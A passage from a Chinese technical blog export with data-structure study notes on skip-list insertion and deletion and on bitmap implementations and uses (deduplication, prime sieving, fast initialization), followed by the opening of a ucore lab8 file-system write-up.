<h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><p>此处通过逻辑表达式<code>rand%2</code> 来模拟投掷硬币，并保证生长概率减半的条件。通过伪随机数的奇偶，近似地模拟一次理想的掷硬币实验。只要伪随机数为奇数，新塔就继续生长，否则停止生长。新塔的期望高度，将取决于此前连续的正面硬币的期望次数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> K, <span class="keyword">typename</span> V&gt; <span class="keyword">bool</span> Skiplist&lt;K, V&gt;::put ( K k, V v ) &#123; <span class="comment">//跳转表词条插入算法</span></span><br><span class="line">   Entry&lt;K, V&gt; e = Entry&lt;K, V&gt; ( k, v ); <span class="comment">//待插入的词条（将被随机地插入多个副本）</span></span><br><span class="line">   <span class="keyword">if</span> ( empty() ) insertAsFirst ( <span class="keyword">new</span> Quadlist&lt;Entry&lt;K, V&gt;&gt; ); <span class="comment">//插入首个Entry</span></span><br><span class="line">   ListNode&lt;Quadlist&lt;Entry&lt;K, V&gt;&gt;*&gt;* qlist = first(); <span class="comment">//从顶层四联表的</span></span><br><span class="line">   QuadlistNode&lt;Entry&lt;K, V&gt;&gt;* p = qlist-&gt;data-&gt;first(); <span class="comment">//首节点出发</span></span><br><span class="line">   <span class="keyword">if</span> ( skipSearch ( qlist, p, k ) ) <span class="comment">//查找适当的插入位置（不大于关键码k的最后一个节点p）</span></span><br><span class="line">      <span class="keyword">while</span> ( p-&gt;below ) p = p-&gt;below; <span class="comment">//若已有雷同词条，则需强制转到塔底</span></span><br><span class="line">   qlist = last(); <span class="comment">//以下，紧邻于p的右侧，一座新塔将自底而上逐层生长</span></span><br><span class="line">   QuadlistNode&lt;Entry&lt;K, V&gt;&gt;* b = qlist-&gt;data-&gt;insertAfterAbove ( e, p ); <span class="comment">//新节点b即新塔基座</span></span><br><span class="line">   <span class="keyword">while</span> ( rand() &amp; <span class="number">1</span> ) &#123; <span class="comment">//经投掷硬币，若确定新塔需要再长高一层，则</span></span><br><span class="line">      <span class="keyword">while</span> ( qlist-&gt;data-&gt;valid ( p ) &amp;&amp; !p-&gt;above ) p = p-&gt;pred; <span class="comment">//找出不低于此高度的最近前驱</span></span><br><span class="line">      <span class="keyword">if</span> ( !qlist-&gt;data-&gt;valid ( p ) ) &#123; <span class="comment">//若该前驱是header</span></span><br><span class="line">         <span class="keyword">if</span> ( qlist == first() ) <span class="comment">//且当前已是最顶层，则意味着必须</span></span><br><span class="line">            insertAsFirst ( <span class="keyword">new</span> Quadlist&lt;Entry&lt;K, V&gt;&gt; ); <span class="comment">//首先创建新的一层，然后</span></span><br><span class="line">         p = qlist-&gt;pred-&gt;data-&gt;first()-&gt;pred; <span class="comment">//将p转至上一层Skiplist的header</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="comment">//否则，可径自</span></span><br><span class="line">         p = p-&gt;above; <span class="comment">//将p提升至该高度</span></span><br><span class="line">      qlist = qlist-&gt;pred; <span class="comment">//上升一层，并在该层</span></span><br><span class="line">      b = qlist-&gt;data-&gt;insertAfterAbove ( e, p, b ); <span class="comment">//将新节点插入p之后、b之上</span></span><br><span class="line">   &#125;<span class="comment">//课后：调整随机参数，观察总体层高的相应变化</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//Dictionary允许重复元素，故插入必成功——这与Hashtable等Map略有差异</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>从跳转表中删除关键码为$k$的词条的具体操作过程</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> K, <span class="keyword">typename</span> V&gt; <span class="keyword">bool</span> Skiplist&lt;K, V&gt;::remove ( K k ) &#123; <span class="comment">//跳转表词条删除算法</span></span><br><span class="line">   <span class="keyword">if</span> ( empty() ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//空表情况</span></span><br><span class="line">   ListNode&lt;Quadlist&lt;Entry&lt;K, V&gt;&gt;*&gt;* qlist = first(); <span class="comment">//从顶层Quadlist的</span></span><br><span class="line">   QuadlistNode&lt;Entry&lt;K, V&gt;&gt;* p = qlist-&gt;data-&gt;first(); <span class="comment">//首节点开始</span></span><br><span class="line">   <span class="keyword">if</span> ( !skipSearch ( qlist, p, k ) ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//目标词条不存在，直接返回</span></span><br><span class="line">   <span class="keyword">do</span> &#123; <span class="comment">//若目标词条存在，则逐层拆除与之对应的塔</span></span><br><span class="line">      QuadlistNode&lt;Entry&lt;K, V&gt;&gt;* lower = p-&gt;below; <span class="comment">//记住下一层节点，并</span></span><br><span class="line">      qlist-&gt;data-&gt;remove ( p ); <span class="comment">//删除当前层节点，再</span></span><br><span class="line">      p = lower; qlist = qlist-&gt;succ; <span class="comment">//转入下一层</span></span><br><span class="line">   &#125; <span class="keyword">while</span> ( qlist-&gt;succ ); <span class="comment">//如上不断重复，直到塔基</span></span><br><span class="line">   <span class="keyword">while</span> ( !empty() &amp;&amp; first()-&gt;data-&gt;empty() ) <span class="comment">//逐一地</span></span><br><span class="line">      List::remove ( first() ); <span class="comment">//清除已可能不含词条的顶层Quadlist</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//删除操作成功完成</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>QuadlistNode</code>节点总是以塔为单位，自顶而下得成批被删除，其中每一节点的删除，都按照如下模式：节点p为当前的塔顶，将它从横向列表中删除，其下邻随后将称为新塔顶，并将在紧随其后的下一次删除操作中被删除。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//删除Quadlist内位置p处的节点，返回其中存放的词条</span></span><br><span class="line">T Quadlist&lt;T&gt;::remove ( QlistNodePosi(T) p ) &#123; <span class="comment">//assert: p为Quadlist中的合法位置</span></span><br><span class="line">   p-&gt;pred-&gt;succ = p-&gt;succ; p-&gt;succ-&gt;pred = p-&gt;pred; _size--;<span class="comment">//摘除节点</span></span><br><span class="line">   T e = p-&gt;entry; <span class="keyword">delete</span> p; <span class="comment">//备份词条，释放节点</span></span><br><span class="line">   <span class="keyword">return</span> e; <span class="comment">//返回词条</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">int</span> Quadlist&lt;T&gt;::clear() &#123; <span class="comment">//清空Quadlist</span></span><br><span class="line">   <span class="keyword">int</span> oldSize = _size;</span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">0</span> &lt; _size ) remove ( header-&gt;succ ); <span class="comment">//逐个删除所有节点</span></span><br><span class="line">   <span class="keyword">return</span> oldSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>词条的删除算法，不外乎消耗于两个方面：</p>
<ul>
<li><strong>查找目标关键码</strong> </li>
<li><strong>拆除与目标关键码相关的塔</strong></li>
</ul>
<p>词条删除操作所需时间不超过$O(h)=O(logn)$</p>
<h1 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h1><p>集合可视为一种抽象数据类型，考查其中的特例，整数集合，按照散列的思想，所有离散集或者显式地本身就是整数集，或者隐式地可转换为整数集。</p>
<p>对集合的操作有：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> k)</span></span>;<span class="comment">//将整数加入当前集合</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">(<span class="keyword">int</span> k)</span></span>;<span class="comment">//从当前集合中排除整数k</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> k)</span>P</span>;<span class="comment">//判断整数是否属于当前集合</span></span><br></pre></td></tr></table></figure>
<p>位图是一种特殊的序列结构，可用于动态地表示由一组无符号整数构成的集合，其长度无限，且每个元素取值为布尔型。</p>
<p>一种简洁的实现方式如下，使用物理地址连续的一段空间，各元素依次对应于一个比特位:若集合包含整数$k$,则该段空间中的第$k$个比特位为1，否则该比特位为0。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bitmap</span> &#123;</span> <span class="comment">//位图Bitmap类</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">      <span class="keyword">char</span>* M; <span class="keyword">int</span> N; <span class="comment">//比特图所存放的空间M[]，容量为N*sizeof(char)*8比特</span></span><br><span class="line">      <span class="keyword">protected</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">init</span> <span class="params">( <span class="keyword">int</span> n )</span> </span>&#123; M = <span class="keyword">new</span> <span class="keyword">char</span>[N = ( n + <span class="number">7</span> ) / <span class="number">8</span>]; <span class="built_in">memset</span> ( M, <span class="number">0</span>, N ); &#125;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    Bitmap ( <span class="keyword">int</span> n = <span class="number">8</span> ) &#123; init ( n ); &#125; <span class="comment">//按指定或默认规模创建比特图（为测试暂时选用较小的默认值）</span></span><br><span class="line">    Bitmap ( <span class="keyword">char</span>* file, <span class="keyword">int</span> n = <span class="number">8</span> ) <span class="comment">//按指定或默认规模，从指定文件中读取比特图</span></span><br><span class="line">    &#123;    </span><br><span class="line">      init ( n ); </span><br><span class="line">      FILE* fp = fopen ( file, <span class="string">&quot;r&quot;</span> ); fread ( M, <span class="keyword">sizeof</span> ( <span class="keyword">char</span> ), N, fp );                     fclose ( fp );  </span><br><span class="line">    &#125;</span><br><span class="line">    ~Bitmap() &#123; <span class="keyword">delete</span> [] M; M = <span class="literal">NULL</span>; &#125; <span class="comment">//析构时释放比特图空间</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set</span>   <span class="params">( <span class="keyword">int</span> k )</span> </span>&#123; expand ( k );  M[k &gt;&gt; <span class="number">3</span>] |=   ( <span class="number">0x80</span> &gt;&gt; ( k &amp; <span class="number">0x07</span> ) ); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">clear</span> <span class="params">( <span class="keyword">int</span> k )</span> </span>&#123; expand ( k );  M[k &gt;&gt; <span class="number">3</span>] &amp;= ~ ( <span class="number">0x80</span> &gt;&gt; ( k &amp; <span class="number">0x07</span> ) ); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">test</span>  <span class="params">( <span class="keyword">int</span> k )</span> </span>&#123; expand ( k ); <span class="keyword">return</span> M[k &gt;&gt; <span class="number">3</span>] &amp;( <span class="number">0x80</span> &gt;&gt; ( k &amp; <span class="number">0x07</span> ) );&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dump</span> <span class="params">( <span class="keyword">char</span>* file )</span> <span class="comment">//将位图整体导出至指定的文件，以便对此后的新位图批量初始化</span></span></span><br><span class="line"><span class="function">    </span>&#123;  FILE* fp = fopen ( file, <span class="string">&quot;w&quot;</span> ); </span><br><span class="line">       fwrite ( M, <span class="keyword">sizeof</span> ( <span class="keyword">char</span> ), N, fp ); </span><br><span class="line">       fclose ( fp );  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">char</span>* <span class="title">bits2string</span> <span class="params">( <span class="keyword">int</span> n )</span> </span>&#123; <span class="comment">//将前n位转换为字符串——</span></span><br><span class="line">       expand ( n - <span class="number">1</span> ); <span class="comment">//此时可能被访问的最高位为bitmap[n - 1]</span></span><br><span class="line">       <span class="keyword">char</span>* s = <span class="keyword">new</span> <span class="keyword">char</span>[n + <span class="number">1</span>]; s[n] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">//字符串所占空间，由上层调用者负责释放</span></span><br><span class="line">       <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++ ) s[i] = test ( i ) ? <span class="string">&#x27;1&#x27;</span> : <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">       <span class="keyword">return</span> s; <span class="comment">//返回字符串位置</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">expand</span> <span class="params">( <span class="keyword">int</span> k )</span> </span>&#123; <span class="comment">//若被访问的Bitmap[k]已出界，则需扩容</span></span><br><span class="line">         <span class="keyword">if</span> ( k &lt; <span class="number">8</span> * N ) <span class="keyword">return</span>; <span class="comment">//仍在界内，无需扩容</span></span><br><span class="line">         <span class="keyword">int</span> oldN = N; <span class="keyword">char</span>* oldM = M;</span><br><span class="line">         init ( <span class="number">2</span> * k ); <span class="comment">//与向量类似，加倍策略</span></span><br><span class="line">         memcpy_s ( M, N, oldM, oldN ); <span class="keyword">delete</span> [] oldM; <span class="comment">//原数据转移至新空间</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>每个字节通常包含8个比特，故通过移位运算：$k&gt;&gt;3$ 即可确定该元素所属字节的秩，通过逻辑与运算$k&amp;0x07$即可确定该比特位在该字节中的位置；通过移位操作(高位顺序在前)：</p>
<p>$0x80&gt;&gt;(k&amp;0x07)$即可得到该比特位在此字节中的数值掩码。 </p>
<p><code>dump()</code>接口将位图导出至指定文件，以便于对此后的新位图进行初始化。</p>
<p><code>set()</code>,<code>clear()</code>,<code>test()</code>仅涉及常数次基本运算，故其时间复杂度为$O(1)$。</p>
<p>位图向量所占的空间线性正比于集合的取值范围。</p>
<h2 id="典型应用"><a href="#典型应用" class="headerlink" title="典型应用"></a>典型应用</h2><blockquote>
<p>int A[n]的元素均取自[0,m)，如何剔除其中的重复者</p>
</blockquote>
<p>仿照无序向量的去重方法，先有序化，再扫描一次$O(nlogn+n)$</p>
<p>但是数据量虽大，但是重复率极高，比如$2^{24}&lt;&lt;n=10^{10}$</p>
<p>即$10000000000$个无符号整数，若采用内部排序算法需要$4*n=40GB$内存，否则，频繁的I/O操作将导致效率低下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">Bitmap <span class="title">B</span><span class="params">(m)</span></span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) B.<span class="built_in">set</span>(A[i]);<span class="comment">//O(n)</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;i&lt;m;k++) <span class="keyword">if</span>(B.test(k)) <span class="comment">/*...*/</span>;<span class="comment">//O(m)</span></span><br></pre></td></tr></table></figure>
<p>可通过位图来利用$m&lt;&lt;n$的条件</p>
<p>总体运行时间$O(n+m)$</p>
<p>空间复杂度$O(m)$,搜索引擎的应用类似，词表规模不大，但是重复的概率很高。</p>
<blockquote>
<p>如何计算[0,n)内的素数</p>
</blockquote>
<p>不计内循环，外循环自身每次仅一次加法、两次判断，累计O(n)</p>
<p>内循环每趟迭代$O(n/i)$步，由素数定理至多$n/lnn$趟，累计耗时不过</p>
<p>$n/2 + n/3 + n/5 + n/7 + n/11 + …&lt;  n/2 + n/3 + n/4 + n/6 + n/7 + … + n/(n/ln(n))$</p>
<p>$=  O(n(ln(n/lnn) - 1))$</p>
<p>$=  O(nln(n) - nln(ln(n)) - 1)$</p>
<p>$=  O(nlogn)$</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Eratosthenes</span> <span class="params">( <span class="keyword">int</span> n, <span class="keyword">char</span>* file )</span> </span>&#123;</span><br><span class="line">   <span class="function">Bitmap <span class="title">B</span> <span class="params">( n )</span></span>; B.<span class="built_in">set</span> ( <span class="number">0</span> ); B.<span class="built_in">set</span> ( <span class="number">1</span> ); <span class="comment">//0和1都不是素数</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n; i++ ) <span class="comment">//反复地，从下一</span></span><br><span class="line">      <span class="keyword">if</span> ( !B.test ( i ) ) <span class="comment">//可认定的素数i起</span></span><br><span class="line">         <span class="keyword">for</span> ( <span class="keyword">int</span> j = __min ( i, <span class="number">46340</span> ) * __min ( i, <span class="number">46340</span> ); j &lt; n; j += i ) <span class="comment">//以i为间隔</span></span><br><span class="line">            B.<span class="built_in">set</span> ( j ); <span class="comment">//将下一个数标记为合数</span></span><br><span class="line">   B.dump ( file ); <span class="comment">//将所有整数的筛选标记统一存入指定文件，以便日后直接导入</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>内循环从$i * i$而非$i + i$开始，迭代步数由$O(n / i)$降至$O(max(1, n / i - i))$</p>
<h2 id="快速初始化"><a href="#快速初始化" class="headerlink" title="快速初始化"></a>快速初始化</h2><p>将$B[m]$拆分为一堆等长的rank型向量，总体空间复杂度仍然为$O(m)$。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bitmap</span> &#123;</span> <span class="comment">//位图Bitmap类：以空间作为补偿，节省初始化时间（仅允许插入，不支持删除）</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">   Rank* F; Rank N; <span class="comment">//规模为N的向量F，记录[k]被标记的次序（即其在栈T[]中的秩）</span></span><br><span class="line">   Rank* T; Rank top; <span class="comment">//容量为N的栈T，记录被标记各位秩的栈，以及栈顶指针</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">   <span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">valid</span> <span class="params">( Rank r )</span> </span>&#123; <span class="keyword">return</span> ( <span class="number">0</span> &lt;= r ) &amp;&amp; ( r &lt; top ); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   Bitmap ( Rank n = <span class="number">8</span> ) <span class="comment">//按指定（或默认）规模创建比特图（为测试暂时选用较小的默认值）</span></span><br><span class="line">   &#123; N = n; F = <span class="keyword">new</span> Rank[N]; T = <span class="keyword">new</span> Rank[N]; top = <span class="number">0</span>; &#125; <span class="comment">//在O(1)时间内隐式地初始化</span></span><br><span class="line">   ~Bitmap() &#123; <span class="keyword">delete</span> [] F; <span class="keyword">delete</span> [] T; &#125; <span class="comment">//析构时释放空间</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 接口</span></span><br><span class="line">   <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">set</span> <span class="params">( Rank k )</span> </span>&#123; <span class="comment">//插入</span></span><br><span class="line">      <span class="keyword">if</span> ( test ( k ) ) <span class="keyword">return</span>; <span class="comment">//忽略已带标记的位</span></span><br><span class="line">      F[k] = top++; T[ F[k] ] = k; <span class="comment">//建立校验环</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">test</span> <span class="params">( Rank k )</span> <span class="comment">//测试</span></span></span><br><span class="line"><span class="function">   </span>&#123;  <span class="keyword">return</span> valid ( F[k] ) &amp;&amp; ( k == T[ F[k] ] );  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>每当需要调用<code>set(k)</code>标记新的$B[k]$位时，即可将$k$压入栈$T[]$中，并将当前元素(当前的顶元素)在栈中的秩存入$F[k]$。在$k$与$T[F[k]]$之间建立了一个校验环路，当$F[k]$指向栈$T[]$中某个有效元素(<code>valid(F[k])</code>)恰好等于$k$时，在逻辑上必然等效于<code>B[k]=True</code>,反之亦然。test(k)只需判断以上两个条件是否成立。</p>
<p>以上方法仅限于标记操作<code>set()</code>，尚且不支持clear()操作。如需兼顾这两个操作，就必须有效地区分两种操作，从未标记过的，以及曾经一度被标记后来又被清除的。否则，每次为无标记的位增加标记时简单套用目前的set()接口为其增加一个校验环，则无法限制在$N$以内，整个结构的空间复杂度也将随着操作的次数严格地单调增加。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bitmap</span> &#123;</span> <span class="comment">//位图Bitmap类：以空间作为补偿，节省初始化时间（既允许插入，亦支持删除）</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">   Rank* F; Rank N; <span class="comment">//规模为N的向量F，记录[k]被标记的次序（即其在栈T[]中的秩）</span></span><br><span class="line">   Rank* T; Rank top; <span class="comment">//容量为N的栈T，记录被标记各位秩的栈，以及栈顶指针</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">   <span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">valid</span> <span class="params">( Rank r )</span> </span>&#123; <span class="keyword">return</span> ( <span class="number">0</span> &lt;= r ) &amp;&amp; ( r &lt; top ); &#125;</span><br><span class="line">   <span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">erased</span> <span class="params">( Rank k )</span> <span class="comment">//判断[k]是否曾被标记过，且后来又被清除</span></span></span><br><span class="line"><span class="function">   </span>&#123; <span class="keyword">return</span> valid ( F[k] ) &amp;&amp; ! ( T[ F[k] ] + <span class="number">1</span> + k ); &#125; <span class="comment">//这里约定：T[ F[k] ] = - 1 - k</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   Bitmap ( Rank n = <span class="number">8</span> ) <span class="comment">//按指定（或默认）规模创建比特图（为测试暂时选用较小的默认值）</span></span><br><span class="line">   &#123; N = n; F = <span class="keyword">new</span> Rank[N]; T = <span class="keyword">new</span> Rank[N]; top = <span class="number">0</span>; &#125; <span class="comment">//在O(1)时间内隐式地初始化</span></span><br><span class="line">   ~Bitmap() &#123; <span class="keyword">delete</span> [] F; <span class="keyword">delete</span> [] T; &#125; <span class="comment">//析构时释放空间</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 接口</span></span><br><span class="line">   <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">set</span> <span class="params">( Rank k )</span> </span>&#123; <span class="comment">//插入</span></span><br><span class="line">      <span class="keyword">if</span> ( test ( k ) ) <span class="keyword">return</span>; <span class="comment">//忽略已带标记的位</span></span><br><span class="line">      <span class="keyword">if</span> ( !erased ( k ) ) F[k] = top++; <span class="comment">//若系初次标记，则创建新校验环</span></span><br><span class="line">      T[ F[k] ] = k; <span class="comment">//若系曾经标记后被清除，则恢复原校验环</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">clear</span> <span class="params">( Rank k )</span> <span class="comment">//删除</span></span></span><br><span class="line"><span class="function">   </span>&#123;  <span class="keyword">if</span> ( test ( k ) ) T[ F[k] ] = - <span class="number">1</span> - k;  &#125; <span class="comment">//忽略不带标记的位</span></span><br><span class="line">   <span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">test</span> <span class="params">( Rank k )</span> <span class="comment">//测试</span></span></span><br><span class="line"><span class="function">   </span>&#123;  <span class="keyword">return</span> valid ( F[k] ) &amp;&amp; ( k == T[ F[k] ] );  &#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>clear()</code>接口将$T[F[k]]$取负之后再减一，也就是再与正常校验环不冲突的情况下就地保留原校验环的信息。</p>
<p><code>set(k)</code>只需调用<code>erased(k)</code>即可判断$k$属于哪种类型，若从未标记过，则按之前的方法新建一个校验环，否则直接恢复原先的校验环。</p>
<p>再考查以上实现的空间复杂度，表面上看$F[]$和$T[]$的规模均不超过$N$,但是两个向量元素类型不再是比特位而是秩。二者的本质区别在于前一类元素自身所占的空间与整体规模无关，而后者有关。这里$rank$类型的取值必须足以覆盖<code>Bitmap</code>的规模，反之，可用Bitmap最大也不能超越$rank$类型的取值范围。比如，$rank$为四个字节类型的整数，则<code>Bitmap</code>的规模无法超过$2^{31}-1=O(10^9)$，否则$rank$的自身字宽必须相应加大。所幸目前多数应用均不超过这个规模，因此可近似认为以上算法具有线性复杂度。</p>
<p>还用于散列表和桶单元的初始化和图的初始化。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>ucore lab8</title>
    <url>/systems/ucore-lab8/</url>
    <content><![CDATA[<p>在之前的lab5中，进程通过读ELF定义全局变量来标识程序的起始位置和信息，从而将程序加载到内存中，从而执行存储在磁盘上的文件读写功能。每次读入数据均从ELF文件中读入显然不现实，所以由操作系统中的文件系统来负责管理和存储可长期保存数据。alb8主要侧重于文件系统的实现，从而实现对文件和目录的一系列操作。</p>
<p>文件系统涉及到的内容比较多，这也是我们称之为文件系统而不是文件子系统的原因吧。</p>
<a id="more"></a>

<blockquote>
<p>填写已有实验</p>
</blockquote>
<p>本实验依赖实验1/2/3/4/5/6/7。请把你做的实验1/2/3/4/5/6/7的代码填入本实验中代码中有“LAB1”/“LAB2”/“LAB3”/“LAB4”/“LAB5”/“LAB6” /“LAB7”的注释相应部分。并确保编译通过。注意：为了能够正确执行lab8的测试应用程序，可能需对已完成的实验1/2/3/4/5/6/7的代码进行进一步改进。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct *<span class="title">alloc_proc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    proc-&gt;filesp = <span class="literal">NULL</span>;<span class="comment">//初始化进程控制块中文件信息</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_fork</span><span class="params">(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//以拷贝文件的方式来完成父子进程之间的拷贝</span></span><br><span class="line">    <span class="keyword">if</span> (copy_files(clone_flags, proc) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>unix提出了四个文件系统抽象概念：文件(file)、目录项(dentry)、索引节点(inode)、安装点(mount point)</p>
<ul>
<li><p>文件：unix文件中的内容可以理解为有序字节buffer，文件都有一个方便应用程序识别的文件名称。</p>
</li>
<li><p>目录项：目录项不是目录，而是目录的组成部分。在UNIX中目录被看作一种特定的文件，而目录项是文件路径中的一部分。如一个文件路径名是“/test/testfile”，则包含的目录项为：根目录“/”，目录“test”和文件“testfile”，这三个都是目录项。一般而言，目录项包含目录项的名字（文件名或目录名）和目录项的索引节点位置。</p>
</li>
<li><p>索引节点：UNIX将文件的相关元数据信息（如访问控制权限、大小、拥有者、创建时间、数据内容等等信息）存储在一个单独的数据结构中，该结构被称为索引节点。</p>
</li>
<li><p>安装点：在UNIX中，文件系统被安装在一个特定的文件路径位置，这个位置就是安装点。所有的已安装文件系统都作为根文件系统树中的叶子出现在系统中。</p>
</li>
</ul>
<p>上述抽象概念形成了UNIX文件系统的逻辑数据结构，并需要通过一个具体文件系统的架构设计与实现把上述信息映射并储存到磁盘介质上。一个具体的文件系统需要在磁盘布局也实现上述抽象概念。比如文件元数据信息存储在磁盘块中的索引节点上。当文件被载如内存时，内核需要使用磁盘块中的索引点来构造内存中的索引节点。</p>
<p><img src="https://i.loli.net/2019/08/31/QjVlPZ1EbFWmSfG.png"></p>
<p>ucore模仿了UNIX的文件系统设计，ucore的文件系统架构主要由四部分组成：</p>
<ul>
<li>通用文件系统访问接口层：该层提供了一个从用户空间到文件系统的标准访问接口。这一层访问接口让应用程序能够通过一个简单的接口获得ucore内核的文件系统服务。</li>
<li>文件系统抽象层：向上提供一个一致的接口给内核其他部分（文件系统相关的系统调用实现模块和其他内核功能模块）访问。向下提供一个同样的抽象函数指针列表和数据结构屏蔽不同文件系统的实现细节。</li>
<li>Simple FS文件系统层：一个基于索引方式的简单文件系统实例。向上通过各种具体函数实现以对应文件系统抽象层提出的抽象函数。向下访问外设接口</li>
<li>外设接口层：向上提供device访问接口屏蔽不同硬件细节。向下实现访问各种具体设备驱动的接口，比如disk设备接口/串口设备接口/键盘设备接口等。</li>
</ul>
<p>以用户态写文件函数write的整个执行过程为例，我们可以比较清晰地看到ucore文件系统架构的层次和依赖关系</p>
<p><img src="https://i.loli.net/2019/08/31/67vZJ9m4efHEFDl.png"></p>
<p><img src="https://i.loli.net/2019/08/31/ERG6KYA4jIqJmWo.png"></p>
<p><img src="https://i.loli.net/2019/08/31/tEDeMYzCdaR7wZB.png"></p>
<p><img src="https://i.loli.net/2019/08/31/4ZKmSfohRpVT7Fz.png"></p>
<p>从ucore操作系统来看，ucore文件系统架构主要包含四类主要的数据结构，分别为：</p>
<ul>
<li>超级块（SuperBlock）：它主要从文件系统的全局角度描述特定文件系统的全局信息。它的作用范围是整个OS空间。</li>
<li>索引节点（inode）：它主要从文件系统的单个文件的角度它描述了文件的各种属性和数据所在位置。它的作用范围是整个OS空间。</li>
<li>目录项（dentry）：它主要从文件系统的文件路径的角度描述了文件路径中的特定目录。它的作用范围是整个OS空间。</li>
<li>文件（file），它主要从进程的角度描述了一个进程在访问文件时需要了解的文件标识，文件读写的位置，文件引用情况等信息。它的作用范围是某一具体进程。</li>
</ul>
<p>如果一个用户进程打开了一个文件，那么在ucore中涉及的相关数据结构和关系如下所示</p>
<p>在<code>kern/process/proc.h</code>中定义的<code>proc_struct</code>中定义了进程访问当前文件的数据接口<code>files_struct</code></p>
